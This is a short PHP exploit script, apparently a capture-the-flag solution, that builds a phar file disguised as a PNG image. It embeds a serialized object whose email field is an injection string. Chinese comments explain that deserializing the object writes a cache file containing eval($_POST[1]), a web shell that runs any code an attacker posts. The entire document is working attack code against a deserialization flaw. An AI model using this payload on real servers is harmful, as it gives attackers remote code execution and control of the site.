<?php
// 生成 phar: 反序列化触发 __wakeup -> sendResetMail($this->email) -> 写入 mail_cache/cache.php
// email 注入串闭合源码中的单引号拼接, 使写入的 PHP 内容包含 eval($_POST[1])
class action {
    private $email = "'.eval(\$_POST[1]));//";
}

$a = new action();

$phar = new Phar("yu22x.phar");
$phar->startBuffering();
$phar->setStub(file_get_contents('a.png') . "<?php __HALT_COMPILER(); ?>");
$phar->addFromString('test.txt', 'yu22x');
$phar->setMetadata($a);
$phar->stopBuffering();
echo "phar generated\n";
